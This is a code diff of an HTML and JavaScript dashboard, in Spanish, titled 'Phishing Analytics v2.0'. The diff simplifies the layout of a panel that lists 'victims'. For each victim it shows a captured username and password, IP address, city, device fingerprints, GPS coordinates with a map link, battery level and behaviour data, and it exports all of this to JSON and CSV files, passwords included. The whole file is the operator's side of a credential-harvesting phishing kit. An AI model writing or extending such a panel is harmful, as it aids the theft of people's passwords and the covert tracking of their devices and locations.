@@ -35,7 +35,6 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(0,255,136,0.3);
         }
         
         .header p {
@@ -91,23 +90,6 @@
             border: 1px solid #00ff8844;
             text-align: center;
             transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.1), transparent);
-            transition: 0.5s;
-        }
-        
-        .stat-card:hover::before {
-            left: 100%;
         }
         
         .stat-card:hover {
@@ -144,9 +126,6 @@
             margin-bottom: 25px;
             font-size: 28px;
             color: #00ff88;
-            display: flex;
-            align-items: center;
-            gap: 10px;
         }
         
         .filter-bar {
@@ -164,12 +143,6 @@
             padding: 10px 15px;
             border-radius: 6px;
             font-size: 14px;
-        }
-        
-        .filter-bar input:focus,
-        .filter-bar select:focus {
-            outline: none;
-            border-color: #00ff88;
         }
         
         .victim-card {
@@ -229,7 +202,6 @@
             margin-bottom: 10px;
             font-size: 14px;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
         
         .detail-item {
@@ -251,7 +223,6 @@
         .password-value {
             color: #ffff00;
             font-weight: bold;
-            text-shadow: 0 0 5px rgba(255,255,0,0.3);
         }
         
         .loading {
@@ -280,11 +251,6 @@
             text-align: center;
             padding: 60px;
             color: #666;
-        }
-        
-        .empty-state h3 {
-            font-size: 24px;
-            margin-bottom: 10px;
         }
         
         .fingerprint-hash {
@@ -326,7 +292,7 @@
 <body>
     <div class="header">
         <h1>🎯 PHISHING ANALYTICS v2.0</h1>
-        <p>Sistema Avanzado de Captura y Análisis de Datos | Hackathon 2025</p>
+        <p>Sistema Avanzado de Captura y Análisis de Datos</p>
     </div>
     
     <div class="controls">
@@ -336,7 +302,7 @@
         <button onclick="exportCSV()" class="secondary">📊 Exportar CSV</button>
     </div>
     
-    <div class="stats" id="statsContainer">
+    <div class="stats">
         <div class="stat-card">
             <h3>👥 Víctimas Totales</h3>
             <div class="number" id="totalVictims">0</div>
@@ -367,7 +333,7 @@
         <h2>📋 Registro Detallado de Víctimas</h2>
         
         <div class="filter-bar">
-            <input type="text" id="searchInput" placeholder="🔍 Buscar por IP, usuario, ciudad..." onkeyup="filterVictims()">
+            <input type="text" id="searchInput" placeholder="🔍 Buscar..." onkeyup="filterVictims()">
             <select id="deviceFilter" onchange="filterVictims()">
                 <option value="">Todos los dispositivos</option>
                 <option value="Mobile">📱 Móviles</option>
@@ -387,7 +353,6 @@
 
     <script>
         let victimsData = [];
-        let autoRefresh = true;
         
         async function loadData() {
             try {
@@ -443,17 +408,13 @@
             const container = document.getElementById('victimsContainer');
             
             if (victims.length === 0) {
-                container.innerHTML = `
-                    <div class="empty-state">
-                        <h3>📭 Sin víctimas capturadas</h3>
-                        <p>Esperando conexiones...</p>
-                    </div>
-                `;
+                container.innerHTML = '<div class="empty-state"><h3>📭 Sin víctimas capturadas</h3><p>Esperando conexiones...</p></div>';
                 return;
             }
             
             container.innerHTML = '';
-            victims.reverse().forEach((victim, index) => {
+            const reversedVictims = [...victims].reverse();
+            reversedVictims.forEach((victim, index) => {
                 const card = createVictimCard(victim, victims.length - index);
                 container.appendChild(card);
             });
@@ -464,14 +425,11 @@
             card.className = 'victim-card';
             
             const date = new Date(victim.timestamp).toLocaleString('es-MX');
-            const deviceIcon = getDeviceIcon(victim.device?.type);
-            const osIcon = getOSIcon(victim.os?.name);
-            const browserIcon = getBrowserIcon(victim.browser?.name);
             
             card.innerHTML = `
                 <div class="victim-header">
                     <div>
-                        <h3>${deviceIcon} ${victim.username || 'Visitor'}</h3>
+                        <h3>${getDeviceIcon(victim.device?.type)} ${victim.username || 'Visitor'}</h3>
                         <span class="victim-badge">#${number}</span>
                         <span class="victim-badge">${victim.device?.type || 'Unknown'}</span>
                         <div class="fingerprint-hash">🔐 ${victim.fingerprint}</div>
@@ -496,7 +454,7 @@
                     </div>
                     
                     <div class="detail-section">
-                        <h4>🌐 Red e IP</h4>
+                        <h4>🌐 Red</h4>
                         <div class="detail-item">
                             <span class="detail-label">IP:</span>
                             <span class="detail-value">${victim.network?.ip || 'Unknown'}</span>
@@ -510,25 +468,13 @@
                             <span class="detail-value">${victim.network?.city || 'Unknown'}</span>
                         </div>
                         <div class="detail-item">
-                            <span class="detail-label">Zona Horaria:</span>
-                            <span class="detail-value">${victim.network?.timezone || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Tipo Conexión:</span>
+                            <span class="detail-label">Conexión:</span>
                             <span class="detail-value">${victim.network?.connectionType || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Velocidad:</span>
-                            <span class="detail-value">${victim.network?.downlink || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Latencia:</span>
-                            <span class="detail-value">${victim.network?.rtt || 'Unknown'}</span>
                         </div>
                     </div>
                     
                     <div class="detail-section">
-                        <h4>${deviceIcon} Dispositivo</h4>
+                        <h4>${getDeviceIcon(victim.device?.type)} Dispositivo</h4>
                         <div class="detail-item">
                             <span class="detail-label">Tipo:</span>
                             <span class="detail-value">${victim.device?.type || 'Unknown'}</span>
@@ -538,76 +484,28 @@
                             <span class="detail-value">${victim.device?.model || 'Unknown'}</span>
                         </div>
                         <div class="detail-item">
-                            <span class="detail-label">Plataforma:</span>
-                            <span class="detail-value">${victim.device?.platform || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">CPU Cores:</span>
-                            <span class="detail-value">${victim.device?.cpuCores || 'Unknown'}</span>
+                            <span class="detail-label">CPU:</span>
+                            <span class="detail-value">${victim.device?.cpuCores || 'Unknown'} cores</span>
                         </div>
                         <div class="detail-item">
                             <span class="detail-label">RAM:</span>
                             <span class="detail-value">${victim.device?.memory || 'Unknown'}</span>
                         </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Touch:</span>
-                            <span class="detail-value">${victim.device?.touchSupport ? '✅ Sí' : '❌ No'}</span>
-                        </div>
                     </div>
                     
                     <div class="detail-section">
-                        <h4>${osIcon} Sistema Operativo</h4>
+                        <h4>${getOSIcon(victim.os?.name)} Sistema</h4>
                         <div class="detail-item">
                             <span class="detail-label">SO:</span>
-                            <span class="detail-value">${victim.os?.name || 'Unknown'}</span>
+                            <span class="detail-value">${victim.os?.name || 'Unknown'} ${victim.os?.version || ''}</span>
                         </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Versión:</span>
-                            <span class="detail-value">${victim.os?.version || 'Unknown'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>${browserIcon} Navegador</h4>
                         <div class="detail-item">
                             <span class="detail-label">Navegador:</span>
-                            <span class="detail-value">${victim.browser?.name || 'Unknown'}</span>
+                            <span class="detail-value">${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}</span>
                         </div>
                         <div class="detail-item">
-                            <span class="detail-label">Versión:</span>
-                            <span class="detail-value">${victim.browser?.version || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Idioma:</span>
-                            <span class="detail-value">${victim.browser?.language || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Cookies:</span>
-                            <span class="detail-value">${victim.browser?.cookiesEnabled ? '✅' : '❌'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">DNT:</span>
-                            <span class="detail-value">${victim.browser?.doNotTrack || 'Unknown'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>🖥️ Pantalla</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Resolución:</span>
+                            <span class="detail-label">Pantalla:</span>
                             <span class="detail-value">${victim.screen?.resolution || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Color Depth:</span>
-                            <span class="detail-value">${victim.screen?.colorDepth || 'Unknown'} bits</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Orientación:</span>
-                            <span class="detail-value">${victim.screen?.orientation || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Pixel Ratio:</span>
-                            <span class="detail-value">${victim.screen?.pixelRatio || 1}</span>
                         </div>
                     </div>
                     
@@ -620,10 +518,6 @@
                         <div class="detail-item">
                             <span class="detail-label">Cargando:</span>
                             <span class="detail-value">${victim.battery?.charging ? '⚡ Sí' : '🔌 No'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">T. Descarga:</span>
-                            <span class="detail-value">${victim.battery?.dischargingTime || 'N/A'}</span>
                         </div>
                     </div>
                     
@@ -638,50 +532,25 @@
                             <span class="detail-value">${victim.behavior?.clicks || 0}</span>
                         </div>
                         <div class="detail-item">
-                            <span class="detail-label">Teclas:</span>
-                            <span class="detail-value">${victim.behavior?.keyPresses || 0}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Scroll:</span>
-                            <span class="detail-value">${victim.behavior?.scrollDepth || 0}%</span>
-                        </div>
-                        <div class="detail-item">
                             <span class="detail-label">Tiempo:</span>
                             <span class="detail-value">${victim.behavior?.timeOnPage || 0}s</span>
                         </div>
                     </div>
                 </div>
                 
-                <button class="expand-btn" onclick="toggleDetails(this)">
-                    🔍 Ver Detalles Avanzados
-                </button>
+                <button class="expand-btn" onclick="toggleDetails(this)">🔍 Ver Más Detalles</button>
                 
                 <div class="hidden-details">
                     <div class="victim-details">
                         <div class="detail-section">
-                            <h4>🎨 Fingerprints</h4>
-                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
-                                <span class="detail-label">Canvas:</span>
-                                <span class="detail-value" style="font-family: monospace; font-size: 11px; word-break: break-all;">${victim.fingerprints?.canvas || 'N/A'}</span>
-                            </div>
+                            <h4>🎨 GPU</h4>
                             <div class="detail-item">
-                                <span class="detail-label">WebGL:</span>
-                                <span class="detail-value">${victim.fingerprints?.webgl || 'N/A'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">GPU Vendor:</span>
+                                <span class="detail-label">Vendor:</span>
                                 <span class="detail-value">${victim.fingerprints?.webglVendor || 'N/A'}</span>
                             </div>
                             <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
-                                <span class="detail-label">GPU Renderer:</span>
+                                <span class="detail-label">Renderer:</span>
                                 <span class="detail-value" style="font-size: 11px;">${victim.fingerprints?.webglRenderer || 'N/A'}</span>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-section">
-                            <h4>🔤 Fuentes (${(victim.fingerprints?.fonts || []).length})</h4>
-                            <div class="detail-value" style="font-size: 12px;">
-                                ${(victim.fingerprints?.fonts || []).join(', ') || 'N/A'}
                             </div>
                         </div>
                         
@@ -695,90 +564,137 @@
                                 <span class="detail-label">Micrófonos:</span>
                                 <span class="detail-value">${victim.hardware?.audioInputs || 'Unknown'}</span>
                             </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Altavoces:</span>
-                                <span class="detail-value">${victim.hardware?.audioOutputs || 'Unknown'}</span>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-section">
-                            <h4>📡 Sensores</h4>
-                            <div class="detail-item">
-                                <span class="detail-label">Acelerómetro:</span>
-                                <span class="detail-value">${victim.sensors?.accelerometer ? '✅' : '❌'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Giroscopio:</span>
-                                <span class="detail-value">${victim.sensors?.gyroscope ? '✅' : '❌'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Magnetómetro:</span>
-                                <span class="detail-value">${victim.sensors?.magnetometer ? '✅' : '❌'}</span>
-                            </div>
                         </div>
                         
                         <div class="detail-section">
                             <h4>🔐 Privacidad</h4>
                             <div class="detail-item">
-                                <span class="detail-label">LocalStorage:</span>
-                                <span class="detail-value">${victim.privacy?.localStorageAvailable ? '✅' : '❌'}</span>
+                                <span class="detail-label">Cookies:</span>
+                                <span class="detail-value">${victim.browser?.cookiesEnabled ? '✅' : '❌'}</span>
                             </div>
                             <div class="detail-item">
-                                <span class="detail-label">SessionStorage:</span>
-                                <span class="detail-value">${victim.privacy?.sessionStorageAvailable ? '✅' : '❌'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">IndexedDB:</span>
-                                <span class="detail-value">${victim.privacy?.indexedDBAvailable ? '✅' : '❌'}</span>
+                                <span class="detail-label">DNT:</span>
+                                <span class="detail-value">${victim.browser?.doNotTrack || 'Unknown'}</span>
                             </div>
                         </div>
                         
                         ${victim.geolocation?.latitude ? `
                         <div class="detail-section">
-                            <h4>🌍 Geolocalización</h4>
+                            <h4>🌍 GPS</h4>
                             <div class="detail-item">
-                                <span class="detail-label">Latitud:</span>
-                                <span class="detail-value">${victim.geolocation?.latitude?.toFixed(6) || 'N/A'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Longitud:</span>
-                                <span class="detail-value">${victim.geolocation?.longitude?.toFixed(6) || 'N/A'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Precisión:</span>
-                                <span class="detail-value">${victim.geolocation?.accuracy ? Math.round(victim.geolocation.accuracy) + 'm' : 'N/A'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Altitud:</span>
-                                <span class="detail-value">${victim.geolocation?.altitude ? Math.round(victim.geolocation.altitude) + 'm' : 'N/A'}</span>
+                                <span class="detail-label">Coords:</span>
+                                <span class="detail-value">${victim.geolocation?.latitude?.toFixed(6)}, ${victim.geolocation?.longitude?.toFixed(6)}</span>
                             </div>
                             <div style="margin-top: 10px;">
                                 <a href="https://www.google.com/maps?q=${victim.geolocation?.latitude},${victim.geolocation?.longitude}" 
                                    target="_blank" 
-                                   style="color: #00ff88; text-decoration: none;">
-                                   📍 Ver en Google Maps
+                                   style="color: #00ff88;">
+                                   📍 Ver en Mapa
                                 </a>
                             </div>
                         </div>
                         ` : ''}
-                        
-                        <div class="detail-section">
-                            <h4>🔗 Referencia</h4>
-                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
-                                <span class="detail-label">URL:</span>
-                                <span class="detail-value" style="font-size: 11px; word-break: break-all;">${victim.url || 'N/A'}</span>
-                            </div>
-                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
-                                <span class="detail-label">Referrer:</span>
-                                <span class="detail-value" style="font-size: 11px; word-break: break-all;">${victim.referrer || 'Direct'}</span>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-section">
-                            <h4>🔧 User Agent</h4>
-                            <div class="detail-value" style="font-size: 11px; word-break: break-all; font-family: monospace;">
-                                ${victim.browser?.userAgent || 'N/A'}
-                            </div>
-                        </div>
                     </div>
-                </div
+                </div>
+            `;
+            
+            return card;
+        }
+        
+        function toggleDetails(button) {
+            const details = button.nextElementSibling;
+            details.classList.toggle('show');
+            button.textContent = details.classList.contains('show') ? 
+                '🔼 Ocultar Detalles' : '🔍 Ver Más Detalles';
+        }
+        
+        function filterVictims() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const deviceFilter = document.getElementById('deviceFilter').value;
+            const osFilter = document.getElementById('osFilter').value;
+            
+            const filtered = victimsData.filter(victim => {
+                const matchesSearch = !searchTerm || 
+                    (victim.network?.ip || '').toLowerCase().includes(searchTerm) ||
+                    (victim.username || '').toLowerCase().includes(searchTerm) ||
+                    (victim.network?.city || '').toLowerCase().includes(searchTerm);
+                
+                const matchesDevice = !deviceFilter || victim.device?.type === deviceFilter;
+                const matchesOS = !osFilter || victim.os?.name === osFilter;
+                
+                return matchesSearch && matchesDevice && matchesOS;
+            });
+            
+            renderVictims(filtered);
+        }
+        
+        function getTimeAgo(date) {
+            const seconds = Math.floor((new Date() - date) / 1000);
+            if (seconds < 60) return 'Hace ' + seconds + ' seg';
+            if (seconds < 3600) return 'Hace ' + Math.floor(seconds / 60) + ' min';
+            if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
+            return 'Hace ' + Math.floor(seconds / 86400) + ' días';
+        }
+        
+        function getDeviceIcon(type) {
+            const icons = {'Mobile': '📱', 'Desktop': '💻', 'Tablet': '📱', 'Unknown': '❓'};
+            return icons[type] || '❓';
+        }
+        
+        function getOSIcon(os) {
+            const icons = {'Windows': '🪟', 'macOS': '🍎', 'iOS': '📱', 'iPadOS': '📱', 'Android': '🤖', 'Linux': '🐧'};
+            return icons[os] || '❓';
+        }
+        
+        async function clearData() {
+            if (confirm('⚠️ ¿Eliminar TODOS los datos?')) {
+                try {
+                    await fetch('/api/clear', { method: 'DELETE' });
+                    alert('✅ Datos eliminados');
+                    loadData();
+                } catch (error) {
+                    alert('❌ Error');
+                }
+            }
+        }
+        
+        async function exportData() {
+            try {
+                const blob = new Blob([JSON.stringify(victimsData, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `victims_${Date.now()}.json`;
+                link.click();
+                URL.revokeObjectURL(url);
+            } catch (error) {
+                alert('❌ Error al exportar');
+            }
+        }
+        
+        async function exportCSV() {
+            try {
+                let csv = 'Timestamp,Username,Password,IP,Country,City,Device,OS,Browser,Battery\n';
+                victimsData.forEach(v => {
+                    csv += `"${v.timestamp}","${v.username}","${v.password}","${v.network?.ip}","${v.network?.country}","${v.network?.city}","${v.device?.type}","${v.os?.name}","${v.browser?.name}","${v.battery?.level}"\n`;
+                });
+                const blob = new Blob([csv], { type: 'text/csv' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `victims_${Date.now()}.csv`;
+                link.click();
+                URL.revokeObjectURL(url);
+            } catch (error) {
+                alert('❌ Error al exportar CSV');
+            }
+        }
+        
+        // Cargar al inicio
+        loadData();
+        
+        // Auto-refresh cada 5 segundos
+        setInterval(loadData, 5000);
+    </script>
+</body>
+</html>
